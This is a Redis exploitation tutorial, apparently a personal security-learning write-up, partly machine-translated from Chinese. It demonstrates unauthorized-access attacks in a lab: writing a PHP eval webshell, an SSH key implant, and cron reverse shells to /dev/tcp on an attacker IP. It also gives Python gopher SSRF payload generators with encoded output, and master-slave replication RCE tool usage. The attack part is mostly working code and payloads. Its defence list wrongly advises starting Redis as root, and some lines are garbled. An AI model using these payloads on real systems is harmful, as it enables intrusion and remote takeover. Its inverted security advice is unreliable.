# Database安全学习—Redis

Author: H3rmesk1t

Data: 2022.02.24

# Redis 简介
[Introduction to Redis](https://redis.io/topics/introduction), `Redis`是一个使用`ANSI C`编写的开源、支持网络、基于内存、分布式、可选持久性的键值对存储数据库.

作为一个`key-value`存储系统, `Redis`和`Memcached`类似, 但是它支持存储的`value`类型相对更多，包括`strings`, `hashes`, `lists`, `sets`, `sorted sets with range queries`, `bitmaps`, `hyperloglogs`, `geospatial indexes`和`streams`. 这些数据类型都可以进行原子操作, 支持`push`/`pop`、`add`/`remove`及取交集并集和差集及更丰富的操作. 在此基础上, `Redis`支持各种不同方式的排序. 为了保证效率, 数据都是缓存在内存中, 与`memcached`有区别的是, `Redis`会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件, 并且在此基础上实现了`master-slave`(主从)同步操作.

`Redis`运行在内存中但是可以持久化到磁盘, 所以在对不同数据集进行高速读写时需要权衡内存, 因为数据量不能大于硬件内存. 在内存数据库方面的另一个优点是: 相比在磁盘上相同的复杂的数据结构, 在内存中操作起来非常简单, 这样`Redis`可以做很多内部复杂性很强的事情. 同时, 在磁盘格式方面它们是紧凑的以追加的方式产生的, 因为它们并不需要进行随机访问.

# Redis 环境搭建
后续漏洞复现均利用`Kali-Linux`来进行演示. 先下载并安装`Redis`:

```bash
wget http://download.redis.io/releases/redis-6.2.5.tar.gz
tar -zxvf redis-6.2.5.tar.gz
```

接着进入到解压好的`Redis`目录中, 通过`make`编译的方式来安装:

```bash
cd redis-6.2.5
make
```

当出现`Hint: It's a good idea to run 'make test'`字样时, 编译安装成功.

<div align=center><img src="./images/1.png"></div>

编译安装结束后, 将`src/redis-server`和`src/redis-cli`拷贝到`/usr/bin`目录下(避免每次都进入安装目录启动`redis-server`和`redis-cli`):

```bash
sudo cp src/redis-server /usr/bin
sudo cp src/redis-cli /usr/bin
```

接着将`redis.conf`拷贝到`/etc`目录下:

```bash
sudo cp redis.conf /etc
```

最后使用`/etc/redis.conf`文件中的配置启动`redis`服务:

```bash
sudo redis-server /etc/redis.conf
```

<div align=center><img src="./images/2.png"></div>

# Redis 基本用法
## redis-cli 命令
`Redis`命令用于在`redis`服务上执行操作, 要在`redis`服务上执行命令, 需要一个`redis`客户端, 在上文安装步骤时解压的安装包内含有该客户端.

本地执行命令时, 先启动`redis`客户端, 打开终端并输入命令`redis-cli`, 去连接本地的`redis`服务. 例如连接到本地的`redis`服务并执行`ping`命令(用于检测`redis`服务是否启动, 服务器运作正常的话, 会返回一个`PONG`字样:

```bash
redis-cli
127.0.0.1:6379> ping
PONG
127.0.0.1:6379> 
```

远程服务执行命令时, 同样是使用`redis-cli`命令:

```bash
redis-cli -h 127.0.0.1 -p 6379 -a "20010728"
127.0.0.1:6379> ping
PONG
127.0.0.1:6379> 
```

## SET 命令
`SET`命令用于设置给定`KEY`的值, 如果`KEY`已经存储其他值, `SET`就覆写旧值并且无视类型. `SET`命令基本语法如下:

```bash
SET KEY_NAME VALUE
```

## GET 命令
`GET`命令用于获取指定`KEY`的值, 如果`KEY`不存在, 则返回`nil`. `GET`命令基本语法如下:

```bash
GET KEY_NAME
```

## FLUSHALL 命令
`FLUSHALL`命令用于清空整个`Redis`服务器的数据(删除所有数据库的所有`KEY`). `FLUSHALL`命令基本语法如下:

```bash
FLUSHALL
```

## SAVE 命令
`SAVE`命令用于创建当前数据库的备份, `SAVE`命令执行一个同步保存操作, 将当前`Redis`实例的所有数据快照(snapshot)以默认`RDB`文件的形式保存到硬盘. `SAVE`命令基本语法如下:

```bash
SAVE
```

## CONFIG 命令
`CONFIG`命令用于恢复当前数据库的备份数据, 只需将备份文件(dump.rdb)移动到`redis`安装目录并启动服务即可. 获取`Redis`目录也可以使用`CONFIG`命令:

```bash
CONFIG GET dir
```

## Redis 配置
`Redis`的配置文件名为`redis.conf`(`Windows`下为`redis.windows.conf`), 通过`CONFIG`命令来查看或者设置配置项:

```bash
CONFIG GET *    // *为获取所有配置项, 这里也可以换成需要查看的配置项
```

<div align=center><img src="./images/3.png"></div>

当需要编辑配置文件时, 可以通过修改`redis.conf`文件或使用`CONFIG set`命令来修改配置:

```bash
CONFIG SET CONFIG_SETTING_NAME NEW_CONFIG_VALUE
```

常见`redis.conf`配置项说明如下:

|配置项|说明|
|:----:|:----:|
|port: 6379|指定 Redis 监听端口, 默认端口为 6379|
|bind: 127.0.0.1 -::1|绑定的主机地址|
|timeout: 300|当客户端闲置多长秒后关闭连接, 指定为 0 时表示关闭该功能|
|databases: 16|设置数据库的数量, 默认数据库为 0, 可以使用 SELECT 命令在连接上指定数据库 id|
|save: <seconds> <changes>|指定在多长时间内, 有多少次更新操作, 就将数据同步到数据文件, 可以多个条件配合|
|dbfilename: dump.rdb|指定本地数据库文件名, 默认值为 dump.rdb|
|dir: ./|指定本地数据库存放目录|
|protected-mode: yes|关闭 protected-mode 模式, 此时外部网络可以直接访问; 开启 protected-mode 保护模式, 需配置 bind ip 或者设置访问密码|

## Redis 安全
可以通过`Redis`的配置文件设置密码参数, 这样做的好处在于, 当客户端连接到`Redis`服务时需要进行密码验证, 从而在一定程度上保证了`Redis`服务的安全性. 可以通过以下命令查看是否设置了密码验证, 默认情况下`requirepass`参数是空的, 无密码验证, 这就意味着无需通过密码验证就可以连接到`Redis`服务:

```bash
CONFIG get requirepass
```

可以通过`SET`命令来设置密码, 从而让客户端连接`Redis`时需要进行密码验证, 否则无法执行命令:

```bash
CONFIG set requirepass "20010728"
```

# Redis 未授权访问漏洞
## 基本概念
默认情况下, `Redis`会绑定在`0.0.0.0:6379`, 如果没有进行采用相关的策略(例如添加防火墙规则避免其他非信任来源`ip`进行访问等), 这样将会将`Redis`服务暴露在公网上. 当没有设置密码认证时, 会导致任意用户在可以访问目标服务器的情况下未授权访问`Redis`以及读取`Redis`的数据. 攻击者在未授权访问`Redis`的情况下, 可以利用`Redis`自身的提供的`CONFIG`命令向目标主机写`WebShell`、`SSH`公钥、创建计划任务反弹`Shell`等. 

利用思路: 
 - 先将`Redis`的本地数据库存放目录设置为`web`目录、`~/.ssh`
Directory or `/var/spool/cron` directory, etc., then set `dbfilename` (local database file name) to the file name you want to write to, and finally execute `SAVE` or `BGSAVE` to save.

Conditions of use:
 - `Redis` is bound to `0.0.0.0:6379` and no firewall rules are added to avoid related security protection operations such as `IP` access from untrusted sources, but are directly exposed to the public network.
 - Password authentication is not set, you can log in to the `Redis` service remotely without using the password.
 - Turn off protected mode (set the parameter `protected-mode` in `redis.conf` to `no`)

Vulnerability hazards:
 - Attackers can access internal data without authentication, which may lead to sensitive information leakage, or execute the `flushall` command to clear all data.
 - Attackers can execute `lua` code through `EVAL`, or write backdoor files to disk through data backup.
 - When `Redis` is running as `root`, an attacker can write a `SSH` public key file to the `root` account, thereby logging into the victim server directly through `SSH`.

## Vulnerability Demo
Experimental environment:
 - Attack aircraft Kali-Linux: 192.168.249.143
 - Kali-Linux: 192.168.249.145

`Redis.conf` configuration:
 - Comment `bind 127.0.0.1 -::1`
 - Change `protected-mode yes` to `protected-mode no`

<div align=center><img src="./images/4.png"></div>

On the attacking machine, use the `Redis` client to log in to the `Redis` server on the victim machine without an account, and successfully list the information on the `Redis` server:

```bash
redis-cli -h 192.168.249.145
```

<div align=center><img src="./images/5.png"></div>

### Write to Webshell with Redis
Conditions of use:
 - The `Redis` connection on the server is unauthorized. You can use `redis-cli` to log in directly on the attack machine, and no login verification is set.
 - There is an open `Web` server on the server, and knows the path of the `Web` directory, and has file read, write, add, delete, modify and check permissions.

Utilization principle:
 - Insert a `Webshell` data into the database, use the code of this `Webshell` as `value` and `key` value at will. Then, by modifying the default path of the database to `/var/www/html` and the default buffer file `shell.php`, save the buffered data in the file, so that a `Webshell` can be generated in the `/var/www/html` directory on the server side.

How to use:
 - Set `dir` to the `/var/www/html` directory, set the specified local database storage directory to `/var/www/html`, set `dbfilename` to the file name `shell.php`, that is, specify the local database file name `shell.php`, and then execute `save` or `bgsave`, then you can write a `Webshell` file with the path `/var/www/html/shell.php`.

Operation steps:

```bash
config set dir /var/www/html/
config set dbfilename shell.php
set xxx "\r\n\r\n<?php eval($_POST[h3]);?>\r\n\r\n" // Write to the file with redis will bring some version information. If you do not wrap the line, it may cause it to fail to execute
save
```

<div align=center><img src="./images/6.png"></div>

View `/var/www/html`, successfully write `Webshell`.

<div align=center><img src="./images/7.png"></div>

<div align=center><img src="./images/8.png"></div>

### Write SSH public key with Redis
Conditions of use:
 - The `Redis` connection on the server is unauthorized. You can use `redis-cli` to log in directly on the attack machine, and no login verification is set.
 - The server has the `.ssh` directory and has write permissions.

Utilization principle:
 - Insert a data into the database, use the local public key as `value` and `key` value at will. Then, by modifying the default path of the database to `/root/.ssh` and the default buffered file `authorized.keys`, save the buffered data in the file, so that an authorized `key` can be generated under `/root/.ssh` on the server side.

Operation steps:

 - Install the `openssh` service.
```bash
# Install openssh service
sudo apt-get install openssh-server
# Start the ssh service
sudo /etc/init.d/ssh start
# Configure root user connection permissions
sudo mousepad /etc/ssh/sshd_config
PermitRootLogin yes
# Settings allow password-free login
AuthorizedKeysFile .ssh/authorized_keys .ssh/authorized_keys2
# Restart the ssh service
sudo /etc/init.d/ssh restart
```

<div align=center><img src="./images/9.png"></div>


 - Generate `ssh` public key`key` in the attack machine's `/root/.ssh` directory:
```bash
# Generate rsa key
ssh-keygen -t rsa
```

 - Import the public key into the `key.txt` file (use `\n` line wrap before and after to avoid mixing with other cache data in `Redis`), and then write the `key.txt` file content into the `Redis` buffer on the server:

```bash
(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > /root/.ssh/key.txt
cat /root/.ssh/key.txt | redis-cli -h 192.168.249.145 -x set xxx // -x represents reading data from standard input as the last parameter of the command.
```

 - Use the attack machine to connect to the target machine `Redis`, set the backup path of `Redis` to `/root/.ssh`, save the file name `authorized_keys`, and save the data on the target server hard disk:

```bash
redis-cli -h 192.168.249.145
config set dir /root/.ssh
config set dbfilename authorized_keys
save
```

 - Use the attack machine `ssh` to connect to the target victim machine:

```bash
ssh 192.168.249.145
```

<div align=center><img src="./images/10.png"></div>

### Write scheduled tasks with Redis
Utilization principle:
 - Insert a data into the database, take the content of the planned task as the `value` and `key` value at will. Then, by modifying the default path of the database to the path of the planned task of the target host, save the buffered data in a file, so that a planned task can be successfully written to the server side and rebounded `shell`.

Operation steps:
 - Turn on monitoring on the attack aircraft first:

```bash
nc -lnvvp 9999
```

 - Connect the `Redis` of the server, write the planned task of rebounding `shell`:

```bash
redis-cli -h 192.168.249.145
set xxx "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.249.143/9999 0>&1\n\n"
config set dir /var/spool/cron/crontabs/
config set dbfilename root
save
```

 - Waiting for about a minute, successfully rebounded in the `nc` of the attack aircraft and came back.

One thing to note here is that the method of using `Redis` to write planned tasks can only be used on `Centos`, and the reasons are:
 - Because the default `redis` file has the permission of `644`, but `ubuntu` requires the execution of the timing task file `/var/spool/cron/crontabs/<username>` permission must be `600`, that is, `-rw—-` to execute, otherwise an error will be reported: (root) INSECURE MODE (mode 0600 expected)`, and the timing task file `/var/spool/cron/<username>` permission `644` of `Centos` can also be executed.
 - `Redis` saves `RDB` and there will be garbled codes, an error will be reported on `Ubuntu`, and an error will not be reported on `Centos`.

# Redis Unauthorized Access Vulnerability in SSRF
## Basic Concept
In the `SSRF` vulnerability, when a port 6379 is opened on the target host through port scanning and other methods, a `Redis` service is likely to exist on the target host. At this time, if the `Redis` on the target host has an unauthorized access vulnerability due to the lack of password authentication or the addition of a firewall, it can
Using the Gopher protocol to remotely manipulate `Redis` on the target host, you can use the `config` commands provided by `Redis`, such as writing `WebShell`, writing `SSH` public key, creating a planned task rebound `Shell`, etc.

Utilization ideas:
 - First set the local database storage directory of Redis to the `web` directory, `~/.ssh` directory, or `/var/spool/cron` directory, etc., then set `dbfilename` (local database file name) to the file name you want to write to, and finally execute `SAVE` or `BGSAVE` to save.

Conditions of use:
 - `Redis` is bound to `0.0.0.0:6379` and no firewall rules are added to avoid related security protection operations such as `IP` access from untrusted sources, but are directly exposed to the public network.
 - Password authentication is not set, you can log in to the `Redis` service remotely without using the password.
 - Turn off protected mode (set the parameter `protected-mode` in `redis.conf` to `no`)

Vulnerability hazards:
 - Attackers can access internal data without authentication, which may lead to sensitive information leakage, or execute the `flushall` command to clear all data.
 - Attackers can execute `lua` code through `EVAL`, or write backdoor files to disk through data backup.
 - When `Redis` is running as `root`, an attacker can write a `SSH` public key file to the `root` account, thereby logging into the victim server directly through `SSH`.

## Vulnerability Demo
Experimental environment:
 - Attack aircraft Kali-Linux: 192.168.249.143
 - Kali-Linux: 192.168.249.145
 - Suppose there is a `Web` service on the victim machine at this time and an `SSRF` vulnerability exists. After scanning the port through `SSRF`, it is found that the target host is running a `Redis` service on port `6379`

`Redis.conf` configuration:
 - Comment `bind 127.0.0.1 -::1`
 - Change `protected-mode yes` to `protected-mode no`

<div align=center><img src="./images/4.png"></div>

### Write to Webshell with Redis
Operation steps:
 - First place a `PHP` file with `SSRF` vulnerability on the `Web` server:

```php
<?php
    function curl($url){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_exec($ch);
        curl_close($ch);
    }
    
    $url = $_GET['url'];
    curl($url);
?>
```

 - Then connect to the `Redis` server and construct the `Redis` command:

```bash
flushall
set ssrf '<?php eval($_POST["h3"]);?>'
config set dir /var/www/html
config set dbfilename shell_ssrf.php
save
```
 
 - Use Python to convert the Redis command above to the Gopher protocol format:

```python
import urllib

protocol = "gopher://"
ip = "192.168.249.145"
port = "6379"
passwd = ""

shell = "\n\n<?php eval($_POST[\"h3\"]);?>\n\n"
filename = "shell_ssrf.php"
path = "/var/www/html"

cmd = ["flushall",
	 "set ssrf {}".format(shell.replace(" ", "${IFS}")),
	 "config set dir {}".format(path),
	 "config set dbfilename {}".format(filename),
	 "save"
	]
if passwd:
	cmd.insert(0, "AUTH {}".format(passwd))

payload = protocol + ip + ":" + port + "/_"

def redis_format(arr):
	CRLF = "\r\n"
	redis_arr = arr.split(" ")
	cmd = ""
	cmd += "*" + str(len(redis_arr))
	for x in redis_arr:
		cmd += CRLF + "$" + str(len((x.replace("${IFS}", " "))))) + CRLF + x.replace("${IFS}", " "))
	cmd += CRLF
	return cmd

if __name__=="__main__":
	for x in cmd:
		payload += urllib.quote(redis_format(x))
	print payload
```

 - Perform the generated `url` quadratic encoding (because we use the GET method to send the payload), and then use the `SSRF` vulnerability on the victim server to use the quadratic encoding `payload` to attack:

```bash
gopher%3A%2F%2F192.168.249.145%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25244%250D%250Assrf%250D %250A%252431%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2522h3%2522%255D%2529%253B%253F%253E%250A%250D%250A%252A4%250D%250A%25246%250D%25 0Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig% 250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%252414%250D%250Ashell_ssrf.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A
```

 - Check the `Web` server of the victim machine and successfully write to the `Webshell`:

<div align=center><img src="./images/11.png"></div>

### Write SSH public key with Redis
Similar to the method of writing `SSH` public key using `Redis` mentioned above, here is just using the `Gohper` protocol to conduct attacks. I will not give a specific demonstration here, and give an attack `Payload`:

Operation steps:
 - Generate `ssh` public key in the attack machine's `/root/.ssh` directory:

```bash
ssh-keygen -t rsa
```

 - Use the generated `id_rsa.pub` content to construct the `Redis` command:

```bash
flushall
set ssrf 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC96S69JNdIOUWoHYOvxpnQxHAVZHl25IkDFBzTbDIbJBBABu8vqZg2GFaWhTa2jSWqMZiYwyPimrXs+XU1kbP4P28yFvofuWR6fYzgrybe O0KX7YmZ4xN4LWaZYEeCxzJrV7BU9wWZIGZiX7Yt5T5M3bOKofxTqqMJaRP7J1Fn9fRq3ePz17BUJNtmRx54I3CpUyigcMSTvQOawwTtXa1ZcS056mjPrKHHBNB2/hKINtJj1JX8 R5Uz+3six+MVsxANT+xOMdjCq++1skSnPczQz2GmlvfAObngQK2Eqim+6xewOL+Zd2bTsWiLzLFpcFWJeoB3z209solGOSkF8nSZK1rDJ4FmZAUvl1RL5BSe/LjJO6+59ihSRFWu 99N3CJcRgXLmc4MAzO4LFF3nhtq0YrIUio0qKsOmt13L0YgSHw2KzCNw4d9Hl3wiIN5ejqEztRi97x8nzAM7WvFq71fBdybzp8eLjiR8oq6ro228BdsAJYevXZPeVxjga4PDtPk= root@kali'
config set dir /root/.ssh/
config set dbfilename authorized_keys
save
```
- Use Python to convert the Redis command above to the Gopher protocol format:

```python
import urllib

protocol = "gopher://"
ip = "192.168.249.145"
port = "6379"
passwd = ""

ssh_pub="\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC96S69JNdIOUWoHYOvxpnQxHAVZHl25IkDFBzTbDIbJBBABu8vqZg2GFaWhTa2jSWqMZiYwyPimrXs+XU1kbP4P28yFvofuWR6fYzgrybe O0KX7YmZ4xN4LWaZYEeCxzJrV7BU9wWZIGZiX7Yt5T5M3bOKofxTqqMJaRP7J1Fn9fRq3ePz17BUJNtmRx54I3CpUyigcMSTvQOawwTtXa1ZcS056mjPrKHHBNB2/hKINtJj1JX8 R5Uz+3six+MVsxANT+xOMdjCq++1skSnPczQz2GmlvfAObngQK2Eqim+6xewOL+Zd2bTsWiLzLFpcFWJeoB3z209solGOSkF8nSZK1rDJ4FmZAUvl1RL5BSe/LjJO6+59ihSRFWu 99N3CJcRgXLmc4MAzO4LFF3nhtq0YrIUio0qKsOmt13L0YgSHw2KzCNw4d9Hl3wiIN5ejqEztRi97x8nzAM7WvFq71fBdybzp8eLjiR8oq6ro228BdsAJYevXZPeVxjga4PDtPk= root@kali\n\n"
filename = "authorized_keys"
path = "/root/.ssh/"

cmd = ["flushall",
	 "set ssrf {}".format(ssh_pub.replace(" ", "${IFS}")),
	 "config set dir {}".format(path),
	 "config set dbfilename {}".format(filename),
	 "save"
	]
if passwd:
	cmd.insert(0, "AUTH {}".format(passwd))

payload = protocol + ip + ":" + port + "/_"

def redis_format(arr):
	CRLF = "\r\n"
	redis_arr = arr.split(" ")
	cmd = ""
	cmd += "*" + str(len(redis_arr))
	for x in redis_arr:
		cmd += CRLF + "$" + str(len((x.replace("${IFS}", " "))))) + CRLF + x.replace("${IFS}", " "))
	cmd += CRLF
	return cmd

if __name__=="__main__":
	for x in cmd:
		payload += urllib.quote(redis_format(x))
	print payload
```

 - Perform the generated `url` quadratic encoding (because we use the GET method to send the payload), and then use the `SSRF` vulnerability on the victim server to use the quadratic encoding `payload` to attack:

```bash
gopher%3A%2F%2F192.168.249.145%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25244%250D% 250Assrf%250D%250A%2524566%250D%250A%250A%250A%250A%250A%250A%250A%250AAAAB3NzaC1yc2EAAAADAQABAAABgQC96S69JNdIOUWoHYOvxpnQxHAVZHl25IkDFBzTbDIbJBBABu8vqZg2GFaWhTa 2jSWqMZiYwyPimrXs%252BXU1kbP4P28yFvofuWR6fYzgrybeO0KX7YmZ4xN4LWaZYEeCxzJrV7BU9wWZIGZiX7Yt5T5M3bOKofxTqqMJaRP7J1Fn9fRq3ePz17BUJNtmRx54I3CpUyigcMSTvQOa wwTtXa1ZcS056mjPrKHHBNB2%2FhKINtJj1JX8R5Uz%252B3six%252BMVsxANT%252BxOMdjCq%252B%252B1skSnPczQz2GmlvfAObngQK2Eqim%252B6xewOL%252BZd2bTsWiLzLFpcFWJeoB 3z209solGOSkF8nSZK1rDJ4FmZAUvl1RL5BSe%2FLjJO6%252B59ihSRFWu99N3CJcRgXLmc4MAzO4LFF3nhtq0YrIUio0qKsOmt13L0YgSHw2KzCNw4d9Hl3wiIN5ejqEztRi97x8nzAM7WvFq7 1fBdybzp8eLjiR8oq6ro228BdsAJYevXZPeVxjga4PDtPk%253D%2520root%2540kali%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D% 250Aset%250D%250A%25243%250D%250Adir%250D%250A%252411%250D%250A%2Froot%2F.ssh%2F%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D %250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%252415%250D%250Aauthorized_keys%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%0D%0A
```

### Write scheduled tasks with Redis
Operation steps:
 - The command to construct `Redis` is as follows:

```bash
flushall
set ssrf '\n\n*/1 * * * * bash -i >& /dev/tcp/192.168.249.143/9999 0>&1\n\n'
config set dir /var/spool/cron/
config set dbfilename root
save
```

 - Use Python to convert the Redis command above to the Gopher protocol format:

```python
import urllib

protocol = "gopher://"
ip = "192.168.249.145"
port = "6379"
passwd = ""
reverse_ip = "192.168.249.143"
reverse_port="9999"

cron = "\n\n\n\n*/1 * * * * * bash -i >& /dev/tcp/%s/%s 0>&1\n\n\n\n\n" % (reverse_ip, reverse_port)
filename = "root"
path = "/var/spool/cron"

cmd = ["flushall",
	 "set ssrf {}".format(cron.replace(" ", "${IFS}")),
	 "config set dir {}".format(path),
	 "config set dbfilename {}".format(filename),
	 "save"
	]
if passwd:
	cmd.insert(0, "AUTH {}".format(passwd))

payload = protocol + ip + ":" + port + "/_"

def redis_format(arr):
	CRLF = "\r\n"
	redis_arr = arr.split(" ")
	cmd = ""
	cmd += "*" + str(len(redis_arr))
	for x in redis_arr:
		cmd += CRLF + "$" + str(len((x.replace("${IFS}", " "))))) + CRLF + x.replace("${IFS}", " "))
	cmd += CRLF
	return cmd

if __name__=="__main__":
	for x in cmd:
		payload += urllib.quote(redis_format(x))
	print payload
```

 - Perform the generated `url` quadratic encoding (because we use the GET method to send the payload), and then use the `SSRF` vulnerability on the victim server to use the quadratic encoding `payload` to attack:

```bash
gopher%3A%2F%2F192.168.249.145%
3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25244%250D%250Assrf%250D%250A%252465%250D%250A%250A%250A%250A%250A %252A%2F1%2520%252A%2520%252A%2520%252A%2520%252A%2520bash%2520-i%2520%253E%2526%2520%2Fdev%2Ftcp%2F192.168.249.143%2F9999%25200%253E%25261%250A%250A%250A%250D%250A%252 A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252415%250D%250A%2Fvar%2Fspool%2Fcron%250D%250A%252A4%250D%250A%25246% 250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25244%250D%250Aroot%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%0D%0A
```

# Redis Master-slave Replication RCE
## Redis Master-slave Copy Concept
Master-slave replication refers to copying the data of a `Redis` server to other `Redis` servers. The former is called `master` (master node), and the latter is called `slave` (slave node). Data replication is one-way and can only be from the master node to the slave node. This is a distributed work plan that replaces time with space, which can reduce the pressure of host cache and avoid single point of failure. Through data replication, a `Redis` master can mount multiple `slave`, and multiple `slave` can also mount multiple `slave` under `slave` to form a multi-layer nested structure. All write operations are performed in the `master` instance. After the `master` is executed, the write instructions are distributed to the `slave` node hanging below it. If there is a nested `slave` node under the `slave`, The received write instructions will be further distributed to the `slave` hanging below you.

<div align=center><img src="./images/12.png"></div>

Turn on three ways of master-slave copying:
 - Configuration file: Add `slaveof <masterip> <masterport>` to the configuration file of the server.
 - Start command: After starting the command `redis-server` is added `--slaveof <masterip> <masterport>`.
 - Client command: After the `Redis` server is started, execute the command `slaveof <masterip> directly through the client
<masterport>`, then the `Redis` instance becomes a slave.

## Redis Master-slave Copy Getshell
After `Reids 4.x`, Redis` has added a module function. Through external expansion, a new `Redis` command can be implemented in `Redis`. Through external expansion (.so), a function for executing system commands can be created in `Redis`. [Vulnerability Detailed Exploit Principle and Exploit Code Writing](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)

## Vulnerability Demo
Experimental environment:
 - Attack aircraft Kali-Linux: 192.168.249.143
 - Victim machine: [Vulnhub-redis](https://github.com/vulhub/vulhub/tree/master/redis/4-unacc)

Directly execute commands in the corresponding folder to pull the corresponding vulnerability environment: `sudo docker-compose up -d`.

<div align=center><img src="./images/13.png"></div>

## Vulnerability Exploit Tools
### redis-rogue-server
Download address:
 - [Download address](https://github.com/n0b0dyCN/redis-rogue-server)
  
Tool Principles:
 - The principle of this tool is to first create a malicious `Redis` server as a Redis` host, which can respond to the responses of other `Redis` slaves that connect it. After having a malicious `Redis` host, it will remotely connect to the target `Redis` server and set the target `Redis` server to the malicious `Redis` slave through the `slaveof` command. Then synchronize the `exp` on the malicious `Redis` host to the `Reids` slave, and set the `dbfilename` to `exp.so`. Finally, control the `Redis` slave loading module to execute system commands. It should be noted that this tool cannot enter the `Redis` password for `Redis` authentication, and can only be used when the target has an unauthorized access vulnerability.

How to use:

```bash
python3 redis-rogue-server.py --rhost 172.21.0.2 --lhost 192.168.249.143
```

After successful execution, you can choose to obtain an interactive shell (interactive shell) or rebound shell (reserve shell):

<div align=center><img src="./images/14.png"></div>

<div align=center><img src="./images/15.png"></div>

### Redis Rogue Server
Download address:
 - [Download address](https://github.com/vulhub/redis-rogue-getshell)

How to use:

```bash
➜ python3 redis-master.py -r target-ip -p 6379 -L local-ip -P 8888 -f RedisModulesSDK/exp.so -c "id"

>> send data: b'*3\r\n$7\r\nSLAVEOF\r\n$13\r\n*.*.*.*\r\n$4\r\n8888\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$6\r\nexp.so\r\n'
>> receive data: b'+OK\r\n'
>> receive data: b'PING\r\n'
>> receive data: b'REPLCONF listening-port 6379\r\n'
>> receive data: b'REPLCONF capa eof capa psync2\r\n'
>> receive data: b'PSYNC 7cce9210b3ad3f54043ce1965cda506bd26b0224 1\r\n'
>> send data: b'*3\r\n$6\r\nMODULE\r\n$4\r\nLOAD\r\n$8\r\n./exp.so\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*3\r\n$7\r\nSLAVEOF\r\n$2\r\nNO\r\n$3\r\nONE\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$8\r\ndump.rdb\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*2\r\n$11\r\nnsystem.exec\r\n$2\r\nid\r\n'
>> receive data: b'$49\r\n\x08uid=999(redis) gid=999(redis) groups=999(redis)\n\r\n'
uid=999(redis) gid=999(redis) groups=999(redis)

>> send data: b'*3\r\n$6\r\nMODULE\r\n$6\r\nUNLOAD\r\n$6\r\nNsystem\r\n'
>> receive data: b'+OK\r\n'
```

### redis-rce
Download address:
 - [Download address](https://github.com/Ridter/redis-rce)

How to use:
 - This tool has a `-a` option, which can be used to perform `Redis` authentication, to make up for the defect that the above tool cannot perform password authentication. However, there is a `exp.so` file missing in this tool, and you also need to add an available `exp.so` file and copy it to the same directory as `redis-rce.py`.

```bash
python3 redis-rce.py -r 172.21
.0.2 -L 192.168.249.143 -f exp.so -a 20010728
```

# Security protection policy
There are mainly the following points to protect the `Redis` service:
 - No monitoring on public network addresses
 - Modify the default listening port
 - Turn on `Redis` security authentication and set complex passwords
 - Use the `root` permission to start
 - Set access permissions for `Redis` configuration file

# refer to
 - [redis master-slave copy RCE](https://lonmar.cn/2021/04/10/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE/)

 - [Summary of Redis attack methods](https://whoamianony.top/2021/03/13/Web%E5%AE%89%E5%85%A8/Redis%20%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/)